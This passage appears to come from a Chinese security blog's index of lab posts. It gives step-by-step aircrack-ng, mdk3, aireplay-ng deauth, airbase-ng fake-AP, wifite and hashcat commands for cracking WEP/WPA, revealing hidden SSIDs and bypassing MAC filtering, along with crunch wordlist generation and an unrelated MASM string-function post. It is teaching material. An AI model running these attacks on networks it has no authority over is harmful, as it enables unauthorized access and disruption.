表示数据库文件，可以是绝对路径。 operation 指定了我们要对数据库进行的操作。 –import {essid|passwd} {file} 导入含有网络名或者秘钥列表的文本文件。文件每行需含一个网络名或者密码，以换行符结束（这样读入时就会被当做“enter”）。 –batch 开始计算所有网络名和密码的组合。此命令需用在aircrack-ng破解之前。当数据库添加了新的SSID或者密码时，也许重新计算。 –export cowpatty [essid] [file] 导出为cowpatty文件。 –sql {sql} 执行所给的SQL语句。 airolib-ng –help 查看帮助文档。 1.创建包含ESSID的文档 创建包含ESSID的文档，每行含有一个ESSID。创建名称为gryffinbit（名称自取）的数据库，向数据库插入ESSID。 1airolib-ng gryffinbit --import essid /root/ssid.txt 2.创建包含密码的文档，并向rainbow数据库插入密码。 1airolib-ng gryffinbit --import password /root/password.txt 3.批量生产PMK数据。 1airolib-ng gryffinbit --batch 查看数据的状态 1airolib-ng gryffinbit --stats 可以看到，当前数据库中有11个ESSID和16个密码，并且已成功对其进行了计算。 4.使用aircrack-ng进行破解 1aircrack-ng -r gryffinbit -e helloworld handshake-01.cap 选项 说明 -r 指定PMK数据库 -e 指定ESSID ​ 也可以选择使用Cowpatty工具进行破解。Cowpatty是一款Linux下用于破解WPA-PSK加密的工具。其语法格式如下： 1cowpatty [options] 选项 说明 -d Hash表 -r 含有握手包的cap文件 -s AP的ESSID 在使用Cowpatty之前，需要先提取用于cowpatty跑的hash 表。 1airolib-ng gryffinbit --export cowpatty helloworld R_table 然后就可以使用Cowpatty工具。 1cowpatty -s kong -d R_table -r .cap ​ ​ 使用airolib-ng生成PMK数据后，可以对该数据进行管理，比如导入第三方数据、校验数据和清理数据。导入ssidlist.txt 文件中的ESSID到数据库。 1airolib-ng gryffinbit --import password /root/password.txt 导入pword.txt 文件中的密码到数据库。 1airolib-ng gryffinbit --import essid /root/ssidlist.txt 使用–verify选项校验数据，以验证数据库的状态正常。也可以使用–clean选项进行数据清理。 1airolib-ng gryffinbit --verify 可以使用下面的命令行插入单个ESSID。插入单个密码也可类似操作。 1echo Love | airolib-ng gryffinbit --import essid - hashcat工具​ hashcat一款强大的开源密码恢复工具。该工具可以利用CPU或GPU资源，破解多种hash类型的密码。当捕获握手包以后，可以使用该工具快速的破解出WPA密码。使用hashcat工具破解WPA的语法格式如下： 1hashcat -m 2500 [pcap file ] [words] --force 选项 说明 -m 指定使用的hash类型,与WPA相关的hash如下图。 Words 指定要使用的字典。 –force 忽略警告信息。 hashcat –help 查看帮助文档。 1.使用aircrack-ng将捕获的握手包文件转换为hccapx格式。 1aircrack-ng test-01.cap -j hashcattest 2.使用hashcat工具进行破解。 1hashcat -m 2500 hashcattest.hccapx /root/password.txt --force","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"物联网","slug":"实验/物联网","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%89%A9%E8%81%94%E7%BD%91/"}],"tags":[{"name":"WPA","slug":"WPA","permalink":"https://gryffinbit.top/tags/WPA/"}],"author":"Gryffinbit"},{"title":"突破WIFI安全限制","slug":"突破WIFI安全限制","date":"2021-05-04T20:30:43.000Z","updated":"2024-11-12T07:00:03.000Z","comments":true,"path":"2021/05/05/突破WIFI安全限制/","permalink":"https://gryffinbit.top/2021/05/05/%E7%AA%81%E7%A0%B4WIFI%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6/","excerpt":"","text":"Aircrack挖掘隐藏ESSID热点实验原理：隐藏ESSID之后，AP发出的网络的信标数据包中不包括其“服务集标识”，也不回复客户端以广播方式发送的“探测请求”数据包。但用户在登录网络进行认证时，就必然会用到“服务集标识”。ESSID可以通过以下方式获取：（1）嗅探无线环境，然后使用mdk3工具暴力破解隐藏的ESSID。（2）嗅探无线环境，等待客户端关联到AP，然后捕获该关联。（3）发起DEAUTH攻击，迫使合法客户端掉线，强制其重关联，然后捕获该关联。 1.开启无线网卡的监听模式1airmon-ng start wlan0 2.扫描周边无线信号1airodump-ng wlan0mon &lt;length:0&gt;表示ESSID被隐藏。 3. 使用mdk3进行暴力破解安装mdk3 1apt install mdk3 1mdk3 wlan0mon p -b a -t 18:D9:8F:66:CD:7D -s 100 选项 说明 p 指定使用BSSID探测和ESSID暴力破解模式。 -b 使用全暴力破解模式。 -t 指定目标AP的MAC地址。 -s 设置发包速率。 4. 只抓取特定BSSID的AP。1airodump-ng wlan0mon -c 1 --bssid 18:D9:8F:66:CD:7C 可以看到这个AP的ESSID处显示为&lt;length:0&gt;，并且有一个mac地址为客户端D0:C6:37:1A:10:E9正在连接目前AP。 5.打开另一个终端进行DEAUTH攻击。1aireplay-ng -0 10 -a 18:D9:8F:66:CD:7C -c **:**:**:**:**: wlan0mon 6. 重新连接时，自动嗅探到ESSID当客户端重新连接目标AP时，就可以自动嗅探到AP的ESSID。或者有新的客户端进行连接时，也可以嗅探到ESSID。 绕过DHCP关闭限制实验原理： ​ 路由器关闭DHCP功能后，也就无法自动给客户端分配IP地址。这样，对方即使能找到该无线网络信号，仍然不能使用网络。​ 我们可以通过airodump-ng抓包，破解密码之后，再用airdecap-ng 解密捕获文件，最后用wireshark分析DHCP ACK数据包，得到相应的配置信息。 1. 打开无线监听，用airodump-ng抓到握手包并保存，破解WPA-PSK密码。12345airmon-ng start wlan0 airodump-ng wlan0monairbase-ng -c 11 -e 假冒AP -W 1 -N wlan0monairodump-ng -c 11 -N 假冒AP -w handshake wlan0monaircrack-ng handshake-01.cap 开始第四步抓包之后，再连入客户端 2. airdecap-ng 解密WPA&#x2F;WPA2、剥离无线标头airdecap-ng 可以解密WPA&#x2F;WPA2捕获文件还可以用于从未加密的无线捕获中剥离无线标头。输出一个-dec.cap结尾的新文件，它是输出文件的解密版本。 选项 说明 -e 给定的ESSID -p PSK密码，再指定要解密的WPA捕获包 1airdecap-ng -e wlan0 -p 1234567 handshake-01.cap 从输出信息可以看到成功解密了0个加密的WPA数据包，之后就可以分析解密的无线数据报文。注：待解密的cap文件中必须含有有效的四次握手包，才能进行解密。此外，airdecap-ng只能解密特定客户端和特定AP之间在握手包之后的会话数据包。这是因为解密时必须要用到握手过程中产生的数据传输密钥。 3. 使用wireshark分析DHCP ACK数据包 可以看到相应的IP地址，默认网关，子网掩码以及DNS服务器。 要连接目标AP，只需输入相应密码，并手动配置DHCP即可。 突破mac地址过滤实验原理： ​ mac地址过滤，就是通过事先在无线路由器内设定允许访问或者禁止访问的无线客户端列表来限制登陆者。 ​ 可以用macchanger把MAC地址修改为合法的MAC地址，然后再连接AP。 1macchanger –help","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"无线网络安全","slug":"实验/无线网络安全","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"WIFI密码破解之WEP加密","slug":"WIFI密码破解之WEP加密","date":"2021-05-04T15:10:24.000Z","updated":"2024-11-12T06:59:03.000Z","comments":true,"path":"2021/05/04/WIFI密码破解之WEP加密/","permalink":"https://gryffinbit.top/2021/05/04/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BWEP%E5%8A%A0%E5%AF%86/","excerpt":"","text":"参考链接：https://www.aircrack-ng.org/doku.php?id=airbase-ng Aircrack-ng破解WEP加密原理： ​ ARP request重放攻击，当抓取到一个ARP请求包的时候对它进行重放，WEP体系允许IV的重复使用，因此AP会对重放的ARP request进行应答，从而能够收集到足够数量的IV。​ 在客户端开启无线，但是没有与目标AP连接的情况下，可以通过airbase-ng伪造目标AP来欺骗客户端与其连接，这时也会产生握手包，通过这个握手包，同样可以实现破解目标AP无线密码以及入侵客户端。 开启无线网卡监听模式1234airmon-ng check kill airmon-ng start wlan0iwconfigairmon-ng stop wlan0mon 在终端输入命令airmon-ng check kill，杀死占用无线网卡的程序。输入airmon-ng start wlan0开启无线网卡的监听模式。 开启监听之后，无线接口已经由wlan0变成了wlan0mon输入iwconfig可以看到，此时wlan0mon处于监听模式。输入airmon-ng stop wlan0mon禁用监听模式，返回到管理模式。 扫描周边无线信号，找到加密算法为WEP的AP1airodump-ng wlan0mon Ctrl+C 停止扫描 捕获相应AP的数据包，并保存捕获到的IVs数据1airodump-ng wlan0mon --bssid 78:A3:51:15:67:C6 --ivs -w wep -c 3 选项 说明 –ivs 表示仅保存用于破解的IVs数据报文； -w 指定数据包保存的文件前缀； –bssid 指定目标AP的mac地址； -c 指定目标AP工作的信道； 其中，捕获到的IVs数据包将保存到wep-xx.ivs文件中 为了加快捕获IVs数据包的速度，打开另一终端，发起ARP request攻击1aireplay-ng -3 -b 78:A3:51:15:67:C6 -h 3c:15:c2:d8:d0:72 wlan0mon 选项 说明 -3 表示实施ARP request攻击； -b 指定目标AP的MAC地址； -h 指定连接AP的合法客户端的MAC地址。 当#Data列数值超过2万时，可以尝试进行破解。注：如果该AP正在进行大流量交互，#Data列数值增长很快，则不需进行ARP攻击。 使用aircrack-ng工具破解密码1aircrack-ng wep-01.ivs Hirte攻击破解WEP攻击思路： Hirte是破解无线网络WEP Key的一种攻击类型 。 只要客户端设备（笔记本电脑，手机等）连接过的无线网络，那些WIFI即使是不在攻击者范围内也都能被破解，因为该wifi的WEP密钥和配置文件仍然存储在这些无线设备中。 实施这种攻击的要求是建立一个和WEP网络相同的SSID假冒接入点。当客户端设备尝试自动连接到无线网络设时，假冒接入点（攻击者机器）会对受害者设备进行ARP攻击，导致受害者设备将包含密钥流的数据包发出。 用airbase-ng工具建立WEP接入点1airbase-ng -c 7 -e 假冒AP -W 1 -N wlan0mon 选项 说明 -c 定义信道 -e 指定要假冒AP的名字 -W 设置加密位 -N 使用Hirte攻击模式。 airbase-ng建立了一个BSSID 为00:24:B2:4A:DE:BD的AP 。后面是客户端连接这个假冒AP之后开始Hirte攻击 。注：第二步开始捕获数据包之后，再用客户端连接假冒AP。 配置airodump-ng捕捉数据包并保存数据包文件名字为cfrag1airodump-ng -c 7 -N 假冒AP -w cfrag wlan0mon 使用aircrack-ng破解WEP。每捕获5000个IVs就开始重新攻击，直至破解 1aircrack-ng cfrag-01.cap 使用Wifite工具破解WEPWifite是一款自动化WEP、WPA和WPS破解工具。 破解 1wifite --wep --keep-ivs 选项 说明 –wep 表示仅显示WEP加密网络； –keep-ivs 表示保留IVs文件。 Wifite将开始等待WEP replay，当WEP replay超过10000时，就会开始尝试破解。 从输出信息可以看到，成功破解了目前AP的密码。破解的密码默认保存到cracked.json中。 查看cracked.json文件。 1cat cracked,json 从输出信息可以看到破解的AP的相关信息。例如，该AP的ESSID和BSSID，加密类型为WEP，十六进制密钥为：12:34:56:78:90 加密 同样的，可以使用wifite 破解WPA加密。 选项 说明 –wpa 表示仅扫描WPA加密的网络。 –dict 指定密码字典。 wifite –help 查看帮助文档 使用Fern WiFi Cracker工具破解WEPFern WiFi Cracker是一款无线安全审计和攻击软件，使用Python编程语言和Python的Qt图形界面库实现。该工具可以破解并恢复WEP、WPA、WPS加密的无线网络密码。","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"无线网络安全","slug":"实验/无线网络安全","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"WIFI密码破解之Aircrack-ng工具集","slug":"WIFI密码破解之Aircrack-ng工具集","date":"2021-05-03T16:33:15.000Z","updated":"2024-11-12T06:59:03.000Z","comments":true,"path":"2021/05/04/WIFI密码破解之Aircrack-ng工具集/","permalink":"https://gryffinbit.top/2021/05/04/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BAircrack-ng%E5%B7%A5%E5%85%B7%E9%9B%86/","excerpt":"","text":"实验环境 macOS Catalina 10.15.7 参考链接：https://mba811.gitbooks.io/web-study/content/wlaq/gj/w1.html 参考链接：https://osxdaily.com/2007/01/18/airport-the-little-known-command-line-wireless-utility/ 参考链接：https://gwliang.com/2020/01/24/wifi-cracking/#appendix.zh.md 参考链接：https://github.com/0x0XDev/JamWiFi Kali 实验步骤文档下载链接 链接: https://pan.baidu.com/s/1lsYFPKTl4SY9Ksltl9OShw 提取码: tx86 复制这段内容后打开百度网盘手机App，操作更方便哦 安装 Download and install XCode 1xcode-select --install Download and install MacPorts Update Mac Ports 1sudo port -v selfupdate Install AirCrack 1brew install aircrack-ng create a symbolic link to the airport command 1cd /usr/sbin 1sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport aircrack - ng​ Aircrack-ng是一个包含了多款工具的无线攻击审计套装，其中包含的工具在无线破解过程中都会用到。​ 在目标AP已有合法客户端连接的情况下，可以通过airodump-ng侦听数据包，然后用aireplay-ng的deauth强制合法客户端掉线，掉线后客户端会尝试重新连接AP，此时会产生握手包。如果成功抓取到该握手包，则可以用字典进行本地离线破解。使用这种方法进行攻击的前提有两个：一是必须处在目标AP的信号范围内；二是已有合法客户端连接该AP。​ 在客户端开启无线，但是没有与目标AP连接的情况下，可以通过airbase-ng伪造目标AP来欺骗客户端与其连接，这时也会产生握手包，通过这个握手包，同样可以实现破解目标AP无线密码以及入侵客户端。 无线网卡工作模式 管理模式（Managed）Managed模式用于无线STA直接与无线AP进行接入连接。 主模式（Master）Master模式允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的无线AP。例如，无线路由器就是工作在Master模式下。对于普通的PC机来说，如果有合适的硬件也可以变成一台无线AP。 Ad_hoc模式 当用户的网络由互相直连的设备组成时，就使用Ad_hoc模式。在这个模式中，各设备之间采用对等网络的方式进行连接，无线通信双方共同承担无线AP的职责。 监听模式（Monitor） Monitor模式主要用于监控无线网络内部的流量，用于检测网络和排错。如果要捕获无线数据包，用户的无线网卡和配套的驱动必须支持监听模式。 ​ 正常情况下，网卡都工作在管理模式，将要发送的数据包发往连接在一起的所有主机，数据包中包含着应该接收数据包主机的正确地址，只有与数据包中目标地址一致的主机才能接收。 ​ 但当处于监听模式时，无论数据包中的目标地址是什么，主机都将接收，而且网络监听不容易被发现。 ​ 因为运行网络监听的主机只是在被动的接收局域网中传输的信息，不主动与其他主机交换信息，也没有修改在网络中传输的数据包。 airport Wireless Tool使用显示基本信息1airport -I 扫描周边无线网络1airport -s 禁用airport，关闭wifi1networksetup -setairportpower airport off 设备名称可以是airport，EN0，EN1等，因Mac硬件和OS X的版本，因此，可能需要指定设备端口，而不是’airport’，例如EN1 EN0或： 1networksetup -setairportpower en0 off 检查端口(以en0为例子，可以替换成其他的)1networksetup -getairportpower en0 启用端口，打开wifi1networksetup -setairportpower en0 on 扫描1airport en0 scan 可以使用grep进行过滤，如 12airport en0 scan |grep WEPairport en0 scan |grep WPA 监听1sudo airport en0 sniff 6 ​ en0是所使用网卡的名称，sniff表示模式，6表示信道 Ctrl c 停止监听 Wireshark分析包 根据Mac地址查看厂商http://www.atoolbox.net/Tool.php?Id=808 http://www.metools.info/other/o67.html https://mac.bmcx.com/d0:76:e7:ef:c3:41__mac/ 在漏洞网站查看公开的漏洞信息Routerpwn.com MAC地址伪装1sudo ifconfig en0 lladdr 00:00:00:00:00:00:01 Deauth攻击https://github.com/0x0XDev/JamWiFi Jamwifi下载： 链接: https://pan.baidu.com/s/180kUZjXXf6PS8C8ZtB2d6Q 提取码: fcu4 复制这段内容后打开百度网盘手机App，操作更方便哦 抓包无线诊断工具 幸运的是，OSX 配备了一套无线诊断工具。 要打开它们，请在按住键盘上 option 键的同时，点击菜单栏中的 Wi-Fi 图标。 然后选择“打开无线诊断…” 测定目标网络信道 打开无线诊断程序，单击窗口 &gt; 扫描。 找到目标网络，记录下其信道和宽度。 抓取一个 4-way handshake 在无线诊断程序打开的情况下，点击菜单栏中的窗口 &gt; 嗅探器。选择你在上一步中找到的信道和宽度。 现在，你需要等待有设备连接到目标网络。如果你正在自己的网络上测试（使用者应当只在自己的网络上进行测试），将任意一个无线设备重新连接就可以抓取 handshake。 当你感觉已经成功抓取 handshake 时，点击停止。 根据你的操作系统版本，抓取的 .wcap 文件将被保存到桌面或/var/tmp/。 将抓取的文件上传到 https://hashcat.net/cap2hccapx/ 就可以将其转换为 .hccapx 文件。 如果你成功的抓到了 handshake ，站点将开始下载一个.hccapx文件。 否则将不会提示下载。 破解1aircrack-ng -w /Users/gryffinbit/Downloads/rockyou.txt /tmp/airportSniffbW3DzV.cap -w表示使用字典，&#x2F;Users&#x2F;gryffinbit&#x2F;Downloads&#x2F;rockyou.txt是字典所在的路径，airportSniffbW3DzV.cap是刚才监听生成的文件。执行后会分析这个文件，最后会询问你得目标网络是哪个。 1aircrack-ng -w dic.txt -M 100 -f 80 -1 -a 2 -b **:**:**:**:**:** /tmp/airportSniffbW3DzV.cap 1aircrack-ng -w /Users/gryffinbit/Documents/攻击包/naive-hashcat/dicts/rockyou.txt -M 100 -f 80 -1 -a 2 -b 40:B0:76:53:31:F8 /Users/gryffinbit/Desktop/Gryffinbit’s\\ MacBook\\ Pro_ch11_2021-05-04_10.43.18.435.pcap -w 指定字典文件 -M 指定最大IVs，根据提示可以适当调大次参数 -f 暴力破解因子，默认2，也可适当调大 -a 加密类型，1:WEP, 2:WPA-PSK -b BSSID，刚刚纪录目标Wi-Fi的Mac地址 - 后面紧跟之前记录的捕获数据的存储地址即可。 更多参数说明可以通过aircrack-ng --help查看。 后记 kali​ airmon-ng是Aircrack-ng中的一个工具，主要用来设置监听模式。在破解无线网络时，通常都是用该工具将无线网卡设置为监听模式。语法格式如下： 1airmon-ng &lt;start|stop&gt; &lt;interface&gt; [channel] 1airmon-ng &lt;check&gt; [kill] 参数含义： 参数 说明 start 启动监听模式 stop 停止监听模式 interface 指定设置监听模式的接口 channel 指定无线网络的信道 check 列出所有可能干扰无线网卡的程序。 kill 杀死所有可能干扰无线网卡的程序。","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"无线网络安全","slug":"实验/无线网络安全","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"macOS","slug":"macOS","permalink":"https://gryffinbit.top/tags/macOS/"}],"author":"Gryffinbit"},{"title":"WIFI密码破解之密码生成","slug":"WIFI密码破解之密码生成","date":"2021-05-03T11:09:54.000Z","updated":"2024-11-12T06:59:05.000Z","comments":true,"path":"2021/05/03/WIFI密码破解之密码生成/","permalink":"https://gryffinbit.top/2021/05/03/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90/","excerpt":"","text":"WIFI密码破解之密码生成本文将介绍crunch以及pwgen生成密码字典方法。利用crunch、pwgen密码生成工具，制作有针对性的破解字典，加快破解速度。 实验环境macOS Catalina 10.15.7 Kali 附件下载链接Rockyou.txt 下载链接 链接: https://pan.baidu.com/s/1syYEHrskSy6P9RPqM8wNvQ 提取码: jvgc 复制这段内容后打开百度网盘手机App，操作更方便哦 先介绍crunch crunchcrunch是一款密码字典创建工具，可以按照指定的规则生成密码字典。使用crunch工具生成的密码可以输出到屏幕，保存到文件或另一个程序中。语法格式如下： 1crunch [min-len] [max-len] [character set] [options] 选项 说明 min-len 生成密码字符串的最小长度。 max-len 生成密码字符串的最大长度。 character set 指定用于生成密码的字符集。crunch工具默认提供的字符集保存在&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst中。用户可以直接使用这些字符集来生成对应的密码字典，也可以手动指定字符串。 Kali 路径：&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst macOS 路径： &#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;crunch&#x2F;3.6&#x2F;share&#x2F;charset.lst crunch命令参数： 选项 说明 -b 指定写入文件最大的字节数 。该大小可以指定KB、MB或GB，但是必须与-o START选项一起使用。 -c 密码个数。 -d 限制出现连续相同元素的个数，比如-d 3就不会出现zzzzf。 -f 调用密码库文件 -o 指定用来保存密码的文件名，以及路径 -p 定义密码元素 -z 打包压缩 -t 定义特殊的输出格式，其中@代表小写字母，%代表数字，^代表符号 安装12brew search crunchbrew install crunch 生成字典在终端输入crunch显示用法 1crunch &lt;min&gt; &lt;max&gt; [options] 示例在终端输入命令“crunch 2 7”，生成最小2位、最大7位、由26个小写字母为元素的所有组合，并显示出来。按ctrl+c即可终止生成。 1crunch 2 7 在终端输入命令“crunch 2 7 abcdef&#x2F;”，生成最小2位、最大7位、由abcdef&#x2F;为元素的所有组合。 1crunch 2 7 abcdef/ 密码库查看密码库1cat /usr/local/Cellar/crunch/3.6/share/charset.lst Kali : 1cat /usr/share/crunch charset.lst 调用密码库调用密码库charset.lst，生成最小为2、最大为7的、元素为密码库charset.lst中hex-lower的项目，并保存为password.txt。(-o指定输出路径) 1crunch 2 7 -f /usr/local/Cellar/crunch/3.6/share/charset.lst hex-lower -o desktop/password.txt Kali 调用密码库charset.lst，生成最小为1、最大为4的、元素为密码库charset.lst中hex-lower的项目，并保存为password.txt。(-o指定输出路径) 1crunch 1 4 -f /usr/share/crunch charset.lst -o /root/password.txt 生成指定元素字典 生成以“I”“love”“you”为元素的所有密码组合 1crunch 2 3 -p I love you 生成以最小为1位、最大为3位、元素为所有小写字母，其中每一个字典文件包含5000个密码，并将文件保存为gzip文件，文件名将以“第一个密码”+“-”+“最后一个密码”+“.txt.gz”保存 1crunch 1 3 -o START -c 5000 -z gzip (当前是在desktop下运行，所以生成路径在desktop) 生成最小为4位、最大为5位、元素为所有小写字母的密码字典，并以10M进行分割；这时会生成8个文件。 1crunch 4 5 -b 10mib -o START 生成4位密码。其中格式为两个数字+一个小写字母+常见符号 1crunch 4 4 ++123+ -y %%@^ 生成3位密码。其中第一位为abc中的一个，第二位为123中的一个，第三位为@#!中的一个 1crunch 3 3 abc+123@#! -t @%^ 生成5个元素组成的密码。其中前三个为I miss you的任意组合，后两个为两个小写自己的任意组合。 1crunch 5 5 -t ddd@@ -p I love you 介绍pwgen pwgen下面介绍如何使用pwgen工具构建复杂密码。pwgen是一款密码生成工具，使用该工具生成的密码相当安全。 其语法格式如下： 1pwgen [option] [pw_length] [num_pw] pwgen工具支持的选项及参数含义如下： 选项 说明 -c 生成的密码至少包含一个大写字母 -A 生成的密码不包含大写字母 -n 生成的密码至少包含一个数字 -0 生成的密码中不包含数字 -y 生成的密码中至少包含一个特殊符号 -s 生成完全随机密码 -B 生成的密码不包含歧义字符，如0、O -v 不要使用任何元音 -1 按行显示密码 安装1brew install pwgen 生成字典pwgen工具生成一个长度为8，并且含有数字、不包含大写字母、不包含歧义字母的4个密码。 1pwgen -nAB 8 4 pwgen工具生成一个长度为17，并且包含大写字母、包含数字、包含特殊符号的5个密码，并按行显示。 1pwgen -ncy1 17 5 生成长度为7的，含有数字和大小写字母的4个密码。 1pwgen -ncC 7 4 后记 Kali中自带了一些密码字典，可以帮助用户实施密码破解。自带密码文件默认保存在&#x2F;usr&#x2F;share&#x2F;wordlists目录中。输入如下命令，查看默认自带内容 1ls /usr/share/wordlists macOS Rockyou.txt 下载链接 链接: https://pan.baidu.com/s/1syYEHrskSy6P9RPqM8wNvQ 提取码: jvgc 复制这段内容后打开百度网盘手机App，操作更方便哦","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"无线网络安全","slug":"实验/无线网络安全","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"macOS","slug":"macOS","permalink":"https://gryffinbit.top/tags/macOS/"},{"name":"wifi破解","slug":"wifi破解","permalink":"https://gryffinbit.top/tags/wifi%E7%A0%B4%E8%A7%A3/"}],"author":"Gryffinbit"},{"title":"用汇编实现C语言函数","slug":"用汇编实现C语言函数","date":"2021-05-02T17:30:16.000Z","updated":"2024-11-12T06:59:55.000Z","comments":true,"path":"2021/05/03/用汇编实现C语言函数/","permalink":"https://gryffinbit.top/2021/05/03/%E7%94%A8%E6%B1%87%E7%BC%96%E5%AE%9E%E7%8E%B0C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0/","excerpt":"","text":"用win32汇编语言实现以下C语言函数， strlen() strcmp() strchr() 安装MASM在官网下载https://www.masm32.com/ 解压文件夹到指定盘符。 配置MASM路径控制面板-&gt;系统和安全-&gt; 系统 -&gt; 高级系统设置 -&gt; 环境变量 -&gt; 系统变量 将masm相关路径添加到系统变量 12变量名：include变量值：%Masm32Dir%\\Include; 12变量名：lib变量值：%Masm32Dir%\\lib; 12变量名：Masm32Dir变量值： C:\\masm32 //填入自己的masm安装路径 12变量名：path变量值：%Masm32Dir%\\Bin;%Masm32Dir%;C:\\Users\\admin\\AppData\\Local\\Microsoft\\WindowsApps;C:\\masm32\\bin; 代码strlen() strlen.asm 1234567891011121314151617181920212223242526272829303132333435363738.386.model flat, stdcallinclude kernel32.incincludelib kernel32.libinclude msvcrt.incincludelib msvcrt.lib.dataszText db &quot;Reverse Engineering&quot;, 0chr db &#x27;i&#x27;format db &quot;%d&quot;, 0AH, 0.codemain PROC LEA EDI, szText MOV ECX,0FFFFFFFFH ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;strlen逻辑 MOV EAX,0 ;计数 count: ;此过程体用于计量字符数目 CMP BYTE PTR [EDI],0 ;将每一个字符与字符串结束符&#x27;\\0&#x27;比较 PUSHFD ;将状态标志位入栈 ADD EDI,1 ;增加字符串索引 INC EAX ;不管三七二十一，先给计数值+1 POPFD ;将状态标志位出栈 LOOPNZ count ;若此字符不等于&#x27;\\0&#x27;，则跳转回count继续计数 DEC EAX ;由于最后将字符=&#x27;\\0&#x27;的情况也计数了，所以需要给计数值-1 INVOKE crt_printf,addr format,EAX ;这里调用过程把计数值打印出来，perfecct! ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; INVOKE crt_getchar INVOKE ExitProcess, 0main ENDPEND main strchr() strchr.asm 12345678910111213141516171819202122232425262728293031323334353637383940414243.386.model flat, stdcallinclude kernel32.incincludelib kernel32.libinclude msvcrt.incincludelib msvcrt.lib.dataszText db &quot;Reverse Engineering&quot;, 0chr db &#x27;i&#x27;format db &quot;%d&quot;, 0AH, 0.codemain PROC LEA EDI, szText MOV ECX,0FFFFFFFFH ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;strchr逻辑 ;1.题目要求返回位置指针，但是打印指针对于判断准确性并不直观。我选用数组下标代替 ;2.由于要求在未找到时返回零，故而这里数组下标的初始值是一 MOV AH,1 ;AH用于存储数组下标，从一开始stringLocate: ;字符串定位过程 MOV AL,[EDI] ;将字符串的字符值送入AL寄存器 CMP AL,chr ;把AL与待查找字符比较 JE print ;如果相等，找到了，跳转到打印过程 CMP AL,0 ;AL与待查找字符不想等，则与终止符比较，是否到了字符串末尾？ JE NotFound ;到达字符串末尾，未找到待查找字符，跳转到“未发现” ADD EDI,1 ;字符串索引值+1 INC AH ;数组下标计数+1 JMP stringLocate ;继续查找 NotFound: MOV AH,0 ;将数组下标值置零，表示未找到 print: INVOKE crt_printf,addr format,AH ;打印 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; INVOKE crt_getchar INVOKE ExitProcess, 0main ENDPEND main strcmp() Strcmp.asm 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556.386.model flat, stdcallinclude kernel32.incincludelib kernel32.libinclude msvcrt.incincludelib msvcrt.lib.dataformat db &quot;%d&quot;, 0AH, 0szText db &quot;Reverse Engineering&quot;, 0szText2 db &quot;Reverse Engineering&quot;, 0 ;szText==szText2szText3 db &quot;Reverse Eng&quot;, 0 ;szText&gt;szText3szText4 db &quot;Reverse Engj&quot;, 0 ;szText&lt;szText4szText5 db &quot;Reverse Engh&quot;, 0 ;szText&gt;szText5.codemain PROC LEA ESI, szText LEA EDI, szText2 ;result=0 ;LEA EDI, szText3 ;result=1 ;LEA EDI, szText4 ;result=-1 ;LEA EDI, szText5 ;result=1 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;strcmp逻辑 compare: ;比较过程 MOV AL,[ESI] ;取第一个字符串对应位置的字符，送入AL MOV AH,[EDI] ;取第二个字符串对应位置的字符，送入AH CMP AL,AH ;比较两个字符的大小 JL less ;第一个字符串小于第二个字符串，跳转 JG greater ;第一个字符串大于第二个字符串，跳转 CMP AL,0 ;字符串一对应位置字符等于字符串二对应位置字符，比较是否为终止符&#x27;\\0&#x27; JE equal ;等于终止符则两字符串相等，跳转 ADD ESI,1 ;不等于终止符则继续比较，索引值+1 ADD EDI,1 ;同上 JMP compare ;那我再比较下一个位置的字符值 ;以下根据字符串比较规则对EAX(存放结果)的赋值 less: MOV EAX,-1 JMP print greater: MOV EAX,1 JMP print equal: MOV EAX,0 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; print: INVOKE crt_printf, addr format, EAX INVOKE crt_getchar INVOKE ExitProcess, 0main ENDPEND main 编译、链接将放入.asm的文件夹，放进masm32的目录下。 Strlen.asm 进入到指定路径-&gt;编译 -&gt;链接 1234cd 